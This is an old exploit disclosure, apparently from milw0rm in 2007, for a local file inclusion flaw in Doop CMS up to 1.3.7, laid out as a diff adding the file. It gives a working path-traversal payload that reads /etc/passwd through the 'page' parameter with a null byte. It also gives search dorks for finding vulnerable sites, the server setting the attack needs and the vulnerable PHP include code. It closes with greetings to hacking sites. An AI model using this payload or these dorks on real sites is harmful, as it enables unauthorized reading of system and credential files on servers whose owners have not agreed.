@@ -1,0 +1,41 @@
+ ______________________________________________________
+|         DOOP CMS <=1.3.7 Local File Inclusion        |
+|______________________________________________________|
+
+ ______________________________________________________
+| vuln path: ?page=/../../../../../../../etc/passwd%00 |
+|                                                      |
+| dork: Doop CMS                                       |
+| dork2: powered by Doop CMS                           |
+|                                                      |       
+| work only if magic_quotes_gpc are set to OFF         |
+|______________________________________________________|
+
+ ______________________________________________________
+| vuln code:                                           |
+| line 544:                                            |
+|  if (!isset($_REQUEST['page'])){                     |
+|    $_REQUEST['page']=$homepage;                      |
+|    $cpage=$_REQUEST['page'];                         |
+|  } else { $cpage=$_REQUEST['page']; }                |
+|                                                      |
+| line 646:                                            |
+|  if ($admin == FALSE && !isset($_SESSION['name']) || isset($_REQUEST['preview'])){
+|    if (file_exists("pages/".$cpage.".htm")){         |
+|        include("pages/".$cpage.".htm");              |
+|    }                                                 |
+|    else include("pages/".$cpage.".html");            |
+|   }                                                  |
+|______________________________________________________|
+ ______________________________________________________
+| greetz to: http://vladii.wordpress.com               |
+|            http://rstzone.org                        |
+|            http://hackpedia.info                     |
+|            SlicK & Shocker & moubik & kw3            |
+|______________________________________________________|
+
+ ______________________________________________________
+|                  @vladii 2007                        |
+|______________________________________________________| 
+
+# milw0rm.com [2007-10-15]
